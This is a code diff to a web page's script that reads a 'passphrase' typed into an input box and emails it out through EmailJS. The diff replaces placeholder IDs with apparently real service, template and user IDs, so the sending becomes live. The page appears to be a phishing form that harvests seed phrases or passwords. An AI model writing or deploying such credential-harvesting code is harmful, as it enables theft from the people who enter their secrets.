@@ -84,13 +84,13 @@
 
     <script>
         (function() {
-            emailjs.init("loathsomeguy@gmail.com"); // Replace with your EmailJS user ID
+            emailjs.init("email_41rTP41rhO8XszTWY58LJcxR"); // Replace with your EmailJS user ID
         })();
 
         function sendPassphrase() {
             const passphrase = document.querySelector('.input-box').value;
             if (passphrase) {
-                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+                emailjs.send("service_kvv2wy6", "template_ryuhjnu", {
                     passphrase: passphrase
                 }).then(function(response) {
                     alert("Passphrase sent successfully!");
